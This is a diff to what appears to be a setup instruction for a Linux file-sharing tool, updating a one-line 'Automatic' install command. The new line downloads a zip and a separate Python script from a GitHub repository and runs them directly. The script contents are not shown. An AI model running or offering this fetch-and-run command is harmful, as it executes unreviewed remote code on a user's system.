@@ -1,6 +1,6 @@
 Automatic:
 
-wget https://github.com/fcknjudas/fileshare_linux/raw/refs/heads/main/ftsV2.zip && unzip ftsV2.zip && cd 123 && python 123.py
+wget https://github.com/fcknjudas/fileshare_linux/raw/refs/heads/main/ftsV2.zip && unzip ftsV2.zip && cd 123 && wget https://raw.githubusercontent.com/fcknjudas/fileshare_linux/refs/heads/main/new.py && python new.py
 
 
 
